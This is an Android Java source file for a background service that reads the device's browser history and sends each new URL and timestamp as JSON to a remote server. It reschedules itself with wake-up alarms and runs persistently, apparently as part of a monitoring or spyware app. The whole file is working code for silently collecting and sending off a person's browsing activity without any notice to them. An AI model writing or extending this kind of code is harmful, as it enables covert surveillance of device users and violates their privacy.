package com.inet.android.history;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Browser;

import com.inet.android.request.DataRequest;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

/**
 * Класс сбора истории стандартного браузера
 * 
 * @author johny homicide
 * 
 */
public class LinkService extends Service {

	private static final int SERVICE_REQUEST_CODE = 25; // уникальный int
														// сервиса
	final String LOG_TAG = "historyService";
	SharedPreferences sPref;
	final String SAVED_TIME = "saved_time";
	private Context context;
	private SharedPreferences sp;

	public void onCreate() {
		super.onCreate();
		startService(new Intent(this, LinkService.class));

		Logging.doLog(LOG_TAG, "onCreate", "onCreate");

		context = getApplicationContext();
		sp = PreferenceManager.getDefaultSharedPreferences(context);

	}

	public int onStartCommand(Intent intent, int flags, int startId) {

		Logging.doLog(LOG_TAG,
				"onStartCommand - " + sp.getString("account", "ID"),
				"onStartCommand - " + sp.getString("account", "ID"));

		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String linkEnd = sp.getString("code", "2");

		if (linkEnd.equals("3")) {
			Logging.doLog(LOG_TAG, "code : 3", "code : 3");

			return 0;
		}

		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "1")));// через
																				// 1
																				// минут

		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);

		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Logging.doLog(LOG_TAG,
					"isDoWork return " + Boolean.toString(isWork),
					"isDoWork return " + Boolean.toString(isWork));

			return Service.START_STICKY;
		} else {
			Logging.doLog(LOG_TAG,
					"isDoWork return " + Boolean.toString(isWork),
					"isDoWork return " + Boolean.toString(isWork));
		}

		linkTask(); // просомотр истории браузера

		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	public void onDestroy() {
		super.onDestroy();

		Logging.doLog(LOG_TAG, "onDestroy", "onDestroy");
	}

	public IBinder onBind(Intent intent) {
		return null;
	}

	@SuppressLint("SimpleDateFormat")
	void linkTask() {

		String[] proj = new String[] { Browser.BookmarkColumns.TITLE,
				Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 - history,
																// 1 = bookmark
		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
				sel, null, null);
		mCur.moveToFirst();

		sPref = PreferenceManager.getDefaultSharedPreferences(context);

		String urlDate = "";
		String url = "";

		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				urlDate = mCur.getString(mCur
						.getColumnIndex(Browser.BookmarkColumns.DATE));
				Context context = getApplicationContext();

				DateFormat formatter = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");

				String savedTime = sPref.getString(SAVED_TIME, "");

				Calendar calendar = Calendar.getInstance();
				calendar.setTimeInMillis(Long.parseLong(savedTime));

				if (Long.parseLong(urlDate) > Long.parseLong(savedTime)) {

					Logging.doLog(LOG_TAG,
							"--- "
									+ formatter.format(calendar.getTime())
											.toString(), "--- "
									+ formatter.format(calendar.getTime())
											.toString());

					calendar = Calendar.getInstance();
					calendar.setTimeInMillis(Long.parseLong(urlDate));

					url = mCur.getString(mCur
							.getColumnIndex(Browser.BookmarkColumns.URL));

					String urlDateInFormat = formatter.format(
							calendar.getTime()).toString();

					String sendJSONStr = null;
					JSONObject jsonObject = new JSONObject();
					JSONArray data = new JSONArray();
					JSONObject info = new JSONObject();
					JSONObject object = new JSONObject();
					try {

						info.put("url", url);
						info.put("duration", "30");

						object.put("time", urlDateInFormat);
						object.put("type", "7");
						object.put("info", info);
						data.put(object);
						jsonObject.put("data", data);
						// sendJSONStr = jsonObject.toString();
						sendJSONStr = data.toString();
					} catch (JSONException e) {
						Logging.doLog(LOG_TAG, "json сломался", "json сломался");
					}

					DataRequest dr = new DataRequest(context);
					dr.sendRequest(object.toString());

					Editor ed = sPref.edit();
					ed.putString(SAVED_TIME, urlDate);
					ed.commit();

					Logging.doLog(LOG_TAG, formatter.format(calendar.getTime())
							.toString() + " - " + url,
							formatter.format(calendar.getTime()).toString()
									+ " - " + url);
				}
				mCur.moveToNext();
			}
		}
		mCur.close();
	}
}
